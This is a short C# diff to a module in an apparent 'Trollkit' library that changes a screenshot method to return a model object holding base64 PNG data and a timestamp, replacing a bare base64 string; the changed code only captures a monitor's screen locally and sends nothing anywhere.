@@ -25,7 +25,7 @@ namespace Trollkit_Library.Modules
 		/// Returns a base64 string of the screenshot
 		/// </summary>
 		/// <returns></returns>
-		public static string MakeScreenshot(string monitorNumber)
+		public static ScreenshotModel MakeScreenshot(string monitorNumber)
 		{
 			int number = 0;
 			bool parse = int.TryParse(monitorNumber, out number);
@@ -41,12 +41,19 @@ namespace Trollkit_Library.Modules
 					g.CopyFromScreen(dm.dmPositionX, dm.dmPositionY, 0, 0, bmp.Size);
 
 					byte[] imageArray = bmp.ToByteArray(ImageFormat.Png);
-					return Convert.ToBase64String(imageArray);
+
+					ScreenshotModel ss = new ScreenshotModel
+					{
+						ScreenshotData = Convert.ToBase64String(imageArray),
+						Timestamp = DateTime.Now
+					};
+
+					return ss;
 				}
 			}
 			else
 			{
-				return "";
+				return default;
 			}
 		}
 
